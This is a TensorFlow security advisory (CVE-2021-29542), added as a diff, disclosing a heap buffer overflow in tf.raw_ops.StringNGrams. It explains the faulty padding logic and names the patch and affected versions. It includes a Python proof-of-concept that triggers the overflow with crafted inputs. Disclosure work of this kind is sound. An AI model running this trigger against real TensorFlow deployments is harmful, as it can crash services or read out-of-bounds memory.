@@ -1,0 +1,75 @@
+<h2>TFSA-2021-029: Heap buffer overflow in <code>StringNGrams</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29542</p>
+<h3>Impact</h3>
+<p>An attacker can cause a heap buffer overflow by passing crafted inputs to
+<code>tf.raw_ops.StringNGrams</code>:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>separator = b'\x02\x00'
+ngram_widths = [7, 6, 11]
+left_pad = b'\x7f\x7f\x7f\x7f\x7f'
+right_pad = b'\x7f\x7f\x25\x5d\x53\x74'
+pad_width = 50
+preserve_short_sequences = True</p>
+<p>l = ['', '', '', '', '', '', '', '', '', '', '']</p>
+<p>data = tf.constant(l, shape=[11], dtype=tf.string)</p>
+<p>l2 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+     0, 0, 3]
+data_splits = tf.constant(l2, shape=[116], dtype=tf.int64)</p>
+<p>out = tf.raw_ops.StringNGrams(data=data,
+    data_splits=data_splits, separator=separator,
+    ngram_widths=ngram_widths, left_pad=left_pad,
+    right_pad=right_pad, pad_width=pad_width,
+    preserve_short_sequences=preserve_short_sequences)
+```</p>
+<p>This is because the
+<a href="https://github.com/tensorflow/tensorflow/blob/1cdd4da14282210cc759e468d9781741ac7d01bf/tensorflow/core/kernels/string_ngrams_op.cc#L171-L185">implementation</a>
+fails to consider corner cases where input would be split in such a way that the
+generated tokens should only contain padding elements:</p>
+<p><code>cc
+for (int ngram_index = 0; ngram_index &lt; num_ngrams; ++ngram_index) {
+  int pad_width = get_pad_width(ngram_width);
+  int left_padding = std::max(0, pad_width - ngram_index);
+  int right_padding = std::max(0, pad_width - (num_ngrams - (ngram_index + 1)));
+  int num_tokens = ngram_width - (left_padding + right_padding);
+  int data_start_index = left_padding &gt; 0 ? 0 : ngram_index - pad_width;
+  ...
+  tstring* ngram = &amp;output[ngram_index];
+  ngram-&gt;reserve(ngram_size);
+  for (int n = 0; n &lt; left_padding; ++n) {
+    ngram-&gt;append(left_pad_);
+    ngram-&gt;append(separator_);
+  }
+  for (int n = 0; n &lt; num_tokens - 1; ++n) {
+    ngram-&gt;append(data[data_start_index + n]);
+    ngram-&gt;append(separator_);
+  }
+  ngram-&gt;append(data[data_start_index + num_tokens - 1]); // &lt;&lt;&lt;
+  for (int n = 0; n &lt; right_padding; ++n) {
+    ngram-&gt;append(separator_);
+    ngram-&gt;append(right_pad_);
+  }
+  ...
+}</code></p>
+<p>If input is such that <code>num_tokens</code> is 0, then, for <code>data_start_index=0</code> (when
+left padding is present), the marked line would result in reading <code>data[-1]</code>.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/ba424dd8f16f7110eea526a8086f1a155f14f22b">ba424dd8f16f7110eea526a8086f1a155f14f22b</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu
+X-Team.</p>
